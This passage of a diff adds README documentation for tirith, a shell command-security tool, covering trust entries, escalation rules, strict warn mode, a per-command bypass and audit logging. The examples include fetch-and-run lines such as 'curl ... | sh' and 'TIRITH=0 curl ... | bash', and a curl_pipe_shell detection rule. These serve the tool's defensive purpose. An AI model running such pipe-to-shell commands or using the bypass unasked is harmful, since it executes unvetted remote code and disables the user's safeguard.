+  - rule_id: curl_pipe_shell
+    patterns:
+      - "get.docker.com"
+```
+
+### Managing trust from the CLI
+
+`tirith trust` manages trusted patterns without hand-editing policy YAML. Trust
+is **narrow and expiring by default**: trust the most specific thing that
+works, and entries expire after 30 days unless you opt out.
+
+```bash
+# Narrowest scope — a specific URL or path is accepted as-is, 30-day TTL.
+tirith trust add raw.githubusercontent.com/org/repo/main/get.sh
+
+# A whole domain / wildcard / bare TLD is broad — it must be opted into.
+tirith trust add get.docker.com --broad --rule curl_pipe_shell
+
+# Opt out of the default TTL, and record why the entry exists.
+tirith trust add example.com --broad --permanent --reason "internal mirror, OPS-42"
+
+tirith trust list                 # scope class per entry; '!' marks broad ones
+tirith trust explain example.com  # what it covers, when it expires, why added
+tirith trust diff                 # what changed in the trust set
+tirith trust gc --expired         # drop expired entries
+```
+
+Each entry's **scope** is classified as `exact`, `substring`, `domain`,
+`wildcard`, or `bare-TLD`. A broad scope (`domain` / `wildcard` / `bare-TLD`)
+requires `--broad`, so a sweeping allow is always a deliberate choice. All
+subcommands support `--format json`. Trust stores written by older versions of
+tirith keep working unchanged — an entry with no TTL is treated as permanent.
+
+### Escalation and action overrides
+
+Warnings are tracked per session. If the same rule fires repeatedly, escalation rules can upgrade to a block:
+
+```yaml
+action_overrides:
+  shortened_url: block            # always block, regardless of default severity
+
+escalation:
+  - trigger: repeat_count
+    rule_ids: ["*"]               # any rule
+    threshold: 5
+    window_minutes: 60
+    action: block
+  - trigger: multi_medium
+    min_findings: 3               # 3+ medium findings on one command → block
+    action: block
+```
+
+Review accumulated warnings at any time:
+
+```bash
+tirith warnings               # table of session warnings
+tirith warnings --format json # structured output
+tirith warnings --clear       # clear after viewing
+```
+
+On shell exit, a one-line summary is printed if any warnings were recorded during the session.
+
+More examples in [docs/cookbook.md](docs/cookbook.md).
+
+### Strict warn mode
+
+With `strict_warn: true` (or `--strict-warn` on the CLI), medium-risk findings prompt for explicit acknowledgement in interactive terminals instead of silently warning:
+
+```
+$ curl -sSL https://get.docker.com | sh
+
+tirith: WARNING
+  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
+tirith: proceed with 1 warning(s)? [y/N]
+```
+
+Shell hooks use exit code 3 for the warn-ack protocol. Old hooks that don't know about exit code 3 fall through to fail-open behavior.
+
+> [!NOTE]
+> Exit code 3 is the warn-ack hook protocol path, not the normal direct-CLI contract. Non-hook callers should not normally see exit code 3; if they do, it indicates acknowledgement is required.
+
+### Bypass
+
+For the rare case you know exactly what you're doing:
+
+```bash
+TIRITH=0 curl -L https://something.xyz | bash
+```
+
+This is a standard shell per-command prefix — the variable only exists for that single command and does not persist in your session. Organizations can disable this entirely: `allow_bypass_env: false` in policy.
+
+> [!CAUTION]
+> `TIRITH=0` is per-command. Do not export it in shell profiles, dotfiles, or CI config — a permanent bypass defeats the entire protection model. If you find yourself reaching for it often, add the trusted source to `allowlist` in your policy file instead.
+
+---
+
+## Data handling
+
+Local JSONL audit log at `~/.local/share/tirith/log.jsonl`:
+- Timestamp, session ID, action, rule IDs, redacted command preview
+- Raw detection data (`raw_action`, `raw_rule_ids`) preserved alongside enforced action for coverage auditing
+- Session warning state at `~/.local/state/tirith/sessions/`
+- **No** full commands, environment variables, or file contents
+
+Disable: `export TIRITH_LOG=0`
+
+---
+
+## Docs
+
+- [Threat model](docs/threat-model.md) — what tirith defends against and what it doesn't
+- [Cookbook](docs/cookbook.md) — policy examples for common setups
+- [Troubleshooting](docs/troubleshooting.md) — shell quirks, latency, false positives
+- [Compatibility](docs/compatibility.md) — stable vs experimental surface
+- [Security policy](SECURITY.md) — vulnerability reporting
+- [Uninstall](docs/uninstall.md) — clean removal per shell and package manager
+
+## License
+
+**Core security coverage ships in the open-source tree.** All 80+ detection rules and the MCP server are available from source. The repository still contains legacy licensing and policy-server code paths, so avoid assuming that every runtime path is already tier-free.
+
+tirith is dual-licensed:
+
+- **AGPL-3.0-only**: [LICENSE-AGPL](LICENSE-AGPL) — free under copyleft terms
+- **Commercial**: [LICENSE-COMMERCIAL](LICENSE-COMMERCIAL) — if AGPL copyleft obligations don't work for your use case, contact contact@tirith.sh for alternative licensing
+
+Third-party data attributions in [NOTICE](NOTICE).
+
+## Star History
+
+[![Star History Chart](https://api.star-history.com/svg?repos=sheeki03/tirith&type=Date)](https://star-history.com/#sheeki03/tirith&Date)
